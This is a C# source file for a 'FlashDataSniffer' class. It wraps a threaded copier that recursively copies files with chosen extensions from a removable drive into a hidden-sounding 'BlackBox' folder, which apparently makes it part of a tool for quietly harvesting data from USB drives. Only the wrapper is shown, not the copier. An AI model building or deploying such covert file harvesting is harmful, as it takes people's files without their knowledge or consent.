using System;
using System.Collections.Generic;
using System.Threading;
using System.IO;

namespace FlashDataSniffer
{
  public class Sniffer
  {
    // CONSTRUCTOR(S):
    #region
    public Sniffer(DriveInfo SniffedDrive, string BlackBox, List<string> SniffedDataFormats)
    { 
      this.SniffedDrive = SniffedDrive;
      this.BlackBox = BlackBox;
      this.SniffedDataFormats = SniffedDataFormats;

      // passing 1-the source of copying (which is the name of the sniffed drive)
      // 2-the destination of copying (which is "...\\BlackBox\\SniffedDriveLabel"
      // 3-the sniffing formats 4-true for recursive.
      Copier = new ThreadingCopy(SniffedDrive.Name, BlackBox + "\\" + SniffedDrive.VolumeLabel.ToString(), SniffedDataFormats, true);
    }
    #endregion

    // PROPERTIES
    #region 
    
    // this is the path of the directory that will store the 
    // files that will be sniffed from the removable drive.
    public string BlackBox
    { get; set; }

    // this is the sniffed removable drive.
    public DriveInfo SniffedDrive
    { get; set; }

    // this is a list of the file extensions to be sniffed from the drive.
    public List<string> SniffedDataFormats
    { get; set; }

    // this is the thread copier that will do the dirty copy work.
    public  ThreadingCopy Copier
    { get; private set; }

    #endregion

    // METHODS:
    #region
    // This is the actual method that does the sniffing.
    public void StartSniffing()
    {
      Copier.StartCopy();
    }
    #endregion
  }
}
